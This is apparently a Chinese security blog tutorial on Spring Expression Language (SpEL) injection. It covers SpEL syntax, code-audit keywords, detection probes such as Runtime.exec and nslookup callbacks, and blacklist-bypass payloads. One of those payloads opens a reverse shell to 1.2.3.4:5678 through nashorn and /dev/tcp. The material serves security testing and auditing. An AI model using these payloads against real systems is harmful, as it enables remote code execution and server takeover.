#  SpEL 表达式注入漏洞   
原创 信安魔方  锐鉴安全   2025-04-24 04:45  
  
声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。  
  
请大家关注公众号支持，不定期有宠粉福利  
  
  
Part-01  
  
    基础  
知识  
     
  
  
Spring 表达式语言(Spring Expression Language,SpEL)是一种功能强大的表达式语言,用于在运行时查询和操作对象图,语法上类似于 Unified EL,但提供了更多的特性,特别是方法调用和基本字符串模板函数。  
  
  
SpEL 表达式语法  
  
1)使用量表达式  
  
在 SpEL 表达式中,我们可以直接使用量表达式:  
  
```
"#{'Hello World'}"
```  
  
  
  
2)使用 java 代码 new/instance of  
  
在 SpEL 表达式中,我们可以直接使用 Java 代码 new/instanceof:  
```
Expression exp = parser.parseExpression("new Spring('Hello World')");
```  
  
  
3)使用 T(Type)  
  
同样的,在 SpEL 表达式中可以使用“T(Type)”来表示 java.lang.Class 实例,常用于引用常量和静态方法：  
```
parser.parseExpression("T(Integer).MAX_VALUE");
```  
  
  
在 SpEL 中可以使用#bean_id 来获取容器内的变量。同时,还存在两个特殊的变量#this 和 #root,分别用来表示使用当前的上下文和引用容器的 root 对象:  
```
String result2 = parser.parseExpression("#root").getValue(ctx, String.class);
String s = new String("abcdef");
ctx.setVariable("abc",s);
parser.parseExpression("#abc.substring(0,1)").getValue(ctx, String.class);
```  
  
  
SpEL 中可以使用 T()操作符声明特定的 Java 类型,一般用来访问 Java 类型中的静态属性或静态方法。括号中需要包含类名的全限定名,也就是包名加上类名。唯一例外的是,SpEL 内置了 java.lang 包下的类声明,也就是说,java.lang.String 可以通过 T(String)访问,而不需要使用全限定名。  
因此,我们通过 T()调用一个类的静态方法,它将返回一个 Class Object,然后再调用相应的方法或属性。同样的,SpEL 也可以对类进行实例化,使用 new 可以直接在SpEL 中创建实例,创建实例的类要通过全限定名进行访问:  
```
ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression("new java.util.Date()");
Date value = (Date) exp.getValue();
System.out.println(value);
```  
  
  
产生 SpEL 表达式注入漏洞的大前提是存在 SpEL 的相关库,因此我们在审计时可以针对这些库进行搜索,并跟踪器参数是否可控。根据常用的库,可以总结出以下常见关键字。  
```
org.springframework.expression.spel.standard
SpelExpressionParser
parseExpression
expression.getValue()
expression.setValue()
```  
  
  
      
  
     
   
Part-02  
  
SpEL 验证  
  
  
产生 SpEL 表达式注入漏洞的另一个主要原因是,很大一部分开发人员未对用户输入进行处理就直接通过解析引擎对 SpEL 继续解析。一旦用户能够控制解析的 SpEL 语句,便可通过反射的方式构造代码执行的 SpEL 语句,从而达到 RCE 的目的。  
SpEL 漏洞的危害有:任意代码执行、获取 SHELL、对服务器进行破坏等。  
  
  
一般来讲,在测试 SpEL 表达式注入漏洞时,我们可以通过插入以下 POC 来检测是否存在 SpEL 表达式注入漏洞:  
```
${255*255}
T(Thread).sleep(10000)
T(java.lang.Runtime).getRuntime().exec('command')
T(java.lang.Runtime).getRuntime().exec("nslookup qianxin.com")
new java.lang.ProcessBuilder("command").start()
new java.lang.ProcessBuilder({'nslookup qianxin.com'}).start()
#this.getClass().forName('java.lang.Runtime').getRuntime().exec('nslookup xxx.com')
```  
  
  
在 SpEL 表达式注入漏洞的实际利用中,会存在一个十分常见的情况:网站存在黑名单校验。此时攻击者需要通过各种方法绕过黑名单的关键词检测或语义检测。对于常见的基于正则的黑名单匹配绕过是相对简单的,可利用以下两种方法构造 Payload。  
  
  
1.利用反射与拆分关键字构造 Payload  
```
#{T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(S
tring).getClass().forName("java.l"+"ang.Ru"+"ntime") .getMethod("getRu"+"ntime").invoke(T(String).getClass().
forName("java.l"+"ang.Ru"+"ntime")), new
String[]{"/bin/bash","-c","command"})}
```  
  
  
2.利用 ScriptEngineManager 构造 Payload  
```
#{T(javax.script.ScriptEngineManager).newInstance() .getEngineByName("nashorn") .eval("s=[3];s[0]='/b
in/bash';s[1]='-c';s[2]='ex"+"ec 5<>/dev/tcp/1.2.3.4/5678;cat <&5 | while read line; do $line 2>&5 >&5;
done';java.la"+"ng.Run"+"time.getRu"+"ntime().ex"+"ec(s);")}
```  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
